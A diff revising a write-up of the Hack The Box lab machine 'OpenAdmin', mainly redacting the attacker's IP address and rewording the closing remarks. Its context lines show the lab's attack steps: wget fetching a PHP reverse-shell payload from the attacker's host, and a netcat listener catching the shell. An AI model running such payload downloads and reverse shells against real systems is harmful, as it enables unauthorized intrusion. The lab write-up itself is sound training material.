@@ -241,9 +241,9 @@ We also see that we can access the vhost at port 52846.
 First, let's infiltrate a php payload.
 
 ```
-jimmy@openadmin:/var/www/internal$ wget http://10.10.14.8:8000/sorryfortheshell.php
---2020-04-10 14:53:18--  http://10.10.14.8:8000/sorryfortheshell.php
-Connecting to 10.10.14.8:8000... connected.
+jimmy@openadmin:/var/www/internal$ wget http://10.10.X.X:8000/sorryfortheshell.php
+--2020-04-10 14:53:18--  http://10.10.X.X:8000/sorryfortheshell.php
+Connecting to 10.10.X.X:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 5492 (5.4K) [application/octet-stream]
 Saving to: ‘sorryfortheshell.php’
@@ -262,7 +262,7 @@ We receive a connection on our handler.
 ```
 root@kali:~/htb/openadmin# nc -nvlp 8888
 listening on [any] 8888 ...
-connect to [10.10.14.8] from (UNKNOWN) [10.10.10.171] 55872
+connect to [10.10.X.X] from (UNKNOWN) [10.10.10.171] 55872
 <SNIP>
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
@@ -310,6 +310,6 @@ You can also execute any reverse shell one liner.
 
 ![nano escape](images/openadmin/nanoescape.png)
 
-# Ending Thoughts
+# Thoughts
 
-This is an easy box that reinforces a few basic techniques for Linux boxes.
+This is a straightforward box that reinforces a few basic techniques for Linux boxes.
